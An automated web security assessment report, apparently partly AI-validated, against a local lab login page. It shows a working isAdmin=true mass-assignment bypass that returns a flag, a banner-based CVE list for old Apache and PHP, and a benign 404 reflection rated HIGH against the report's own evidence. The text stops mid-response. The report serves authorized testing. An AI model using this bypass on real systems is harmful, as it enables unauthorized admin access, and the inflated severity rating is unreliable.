@@ -1,0 +1,883 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyn94iy-t8uxxb</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [mass-assignment] Mass-assignment auth/privilege bypass via client-controlled isAdmin field</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.25 (Debian) — known auth-bypass / SSRF / privesc CVEs</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] Input returned in response (reflected)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-Life PHP 5.6.40 — unsupported runtime, no security patches since 2018</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyn94iy-t8uxxb</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32836/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T03:14:17.994Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32836</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">3</b> high</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [mass-assignment] Mass-assignment auth/privilege bypass via client-controlled isAdmin field</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836/</div>
+<div class="desc">The login form at `/` submits a hidden `isAdmin` field to POST /index.php. The server trusts this client-controlled value: submitting `isAdmin=true` returns the admin/success page (3311 bytes, containing &quot;Congratulations&quot; and a flag) regardless of the username/password supplied, whereas `isAdmin=false`, `isAdmin=0`, `isAdmin=1`, or omitting the field returns the 3223/3169-byte failed-login form. Success is fully credential-independent (admin/admin, baduser/badpass, zzz/qqq all return the identical 3311-byte success page with isAdmin=true), so an unauthenticated attacker gains the privileged/admin code path with no valid credentials simply by setting the hidden field to the truthy string &quot;true&quot;. Classic mass-assignment / insecure trust of a request-supplied role flag. Note the server requires the exact string &quot;true&quot; (numeric &quot;1&quot; does not trigger it), indicating a literal string comparison on attacker-supplied input rather than authentication.</div>
+<div><b>Reproduction</b></div><pre>POST /index.php with Content-Type application/x-www-form-urlencoded and body `username=baduser&amp;password=badpass&amp;isAdmin=true`. The server returns the 3311-byte success page containing &quot;Congratulations&quot; and the flag. Negative control: the same request with `isAdmin=false` returns the 3223-byte failed-login form with no success/flag content. Confirmed via probe_logic: baseline (isAdmin=false) marker=false @3223, mutated (isAdmin=true) marker=&quot;Congratulations&quot;=true @3311 across two replays.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynicjj-f</code> — <code>artifacts/s-0001/ev-mqynicjj-f/</code></div><div class="lbl">REQUEST</div><pre>POST /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=baduser&amp;password=badpass&amp;isAdmin=false</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3223
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:21:28 GMT
+keep-alive: timeout=5, max=97
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;center&gt;&lt;h3&gt;Incorrect username/password!&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynicrg-g</code> — <code>artifacts/s-0001/ev-mqynicrg-g/</code></div><div class="lbl">REQUEST</div><pre>POST /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=baduser&amp;password=badpass&amp;isAdmin=true</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3311
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:21:28 GMT
+keep-alive: timeout=5, max=96
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;center&gt;&lt;h2&gt;Welcome Admin&lt;/h2&gt;&lt;/center&gt;&lt;center&gt;&lt;h3&gt;Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyniczc-h</code> — <code>artifacts/s-0001/ev-mqyniczc-h/</code></div><div class="lbl">REQUEST</div><pre>POST /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=baduser&amp;password=badpass&amp;isAdmin=true</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3311
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:21:28 GMT
+keep-alive: timeout=5, max=95
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;center&gt;&lt;h2&gt;Welcome Admin&lt;/h2&gt;&lt;/center&gt;&lt;center&gt;&lt;h3&gt;Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.25 (Debian) — known auth-bypass / SSRF / privesc CVEs</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836/</div>
+<div class="desc">VERSION-BASED finding (matched by server banner, NOT exploited). The server advertises `Server: Apache/2.4.25 (Debian)` on every response (and in the default 404 footer: &quot;Apache/2.4.25 (Debian) Server at target.local Port 32836&quot;). Apache httpd 2.4.25 was released Dec 2016 and is missing years of security fixes. Known CVEs affecting 2.4.25 include:
+- CVE-2017-3167 (HIGH) — ap_get_basic_auth_pw() authentication bypass for third-party modules (fixed in 2.4.26).
+- CVE-2019-0211 (HIGH, CVSS 7.8) — local privilege escalation to the parent process / root via the scoreboard (affects 2.4.17–2.4.38; mpm prefork/worker/event).
+- CVE-2021-40438 (CRITICAL, CVSS 9.0) — mod_proxy SSRF via a crafted request URI (fixed in 2.4.49); applies if mod_proxy is loaded.
+- CVE-2017-9798 (MEDIUM) — &quot;Optionsbleed&quot; use-after-free memory disclosure via OPTIONS + &lt;Limit&gt; in .htaccess (fixed in 2.4.28).
+- Also CVE-2017-7659/-7668/-7679, CVE-2018-1312, CVE-2019-0220 (mod_http2/mod_mime/ap_find_token/mod_auth_digest/URL-normalization), all fixed in later 2.4.x.
+Severity set HIGH by the worst applicable issue (remote auth bypass CVE-2017-3167 + critical mod_proxy SSRF CVE-2021-40438). NOT actively confirmed on this target — the operator should verify which modules (mod_proxy, mod_auth_digest, mod_http2) are enabled and upgrade to a current 2.4.x. Note: CVE-2021-41773/-42013 do NOT apply (those are specific to 2.4.49/2.4.50).</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32836/ → response carries `Server: Apache/2.4.25 (Debian)` (200, 3169 bytes) [ev-mqynql25-19].
+2. GET http://target.local:32836/index.php → same banner, stable (200, 3169 bytes) [ev-mqynqm3x-1a].
+3. Negative control: GET /verdict-nonexistent-banner-control-404 → 404 (318 bytes) — distinguishable status/length; default Apache 404 page also footers &quot;Apache/2.4.25 (Debian)&quot; [ev-mqynqmrd-1b].
+4. Map the banner version 2.4.25 against the CVE list above; verify enabled modules before relying on individual CVEs.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynqmrd-1b</code> — <code>artifacts/_/ev-mqynqmrd-1b/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-banner-control-404 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 318
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 03:27:54 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.25 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /verdict-nonexistent-banner-control-404 was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.25 (Debian) Server at target.local Port 32836&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynql25-19</code> — <code>artifacts/_/ev-mqynql25-19/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3169
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:27:52 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynqm3x-1a</code> — <code>artifacts/_/ev-mqynqm3x-1a/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3169
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:27:53 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [burp✓] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control GET /index.php (200) lacked the marker; two stable GET /index.phpUmbr4Refl3ctK9z requests each returned a 404 page reflecting the token verbatim (&quot;The requested URL /index.phpUmbr4Refl3ctK9z was not found&quot;), confirming the info-level reflection (Apache default 404 echo, no executable XSS shown). (severity raised info→high: confirmed real, not info-only)
+
+The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32836/index.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynskxk-1c</code> — <code>artifacts/_/ev-mqynskxk-1c/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32836
+
+GET /index.php9bvmr2f3sr HTTP/1.1
+Host: target.local:32836
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 404 Not Found
+Date: Mon, 29 Jun 2026 03:28:56 GMT
+Server: Apache/2.4.25 (Debian)
+Content-Length: 300
+Content-Type: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
